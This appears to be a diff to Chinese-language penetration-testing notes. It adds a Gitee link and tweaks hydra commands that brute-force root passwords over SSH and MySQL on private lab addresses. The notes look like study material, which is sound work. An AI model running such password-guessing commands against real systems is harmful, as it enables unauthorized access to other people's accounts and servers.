@@ -1,3 +1,4 @@
+https://gitee.com/windyjxx/projects
 
 
 ## 内网穿透
@@ -43,6 +44,6 @@ sudo hydra -l root -P wordlist.TXT ssh：//192.168.136.142
 
 __mysql__
 
-hydra -l root -P ./password.txt -t 1 -e n -f -v 192.168.43.17 mysql
+hydra -l root -P ./password.txt -t 1 -e n -f -v 192.168.43.17 mysql -w 1
 hydra -l root -P ./password.txt -t 2 -e n -f -v 192.168.43.17 mysql
 hydra -L ./user.txt -P ./password.txt -t 2 -e n -f -v 192.168.43.17 mysql
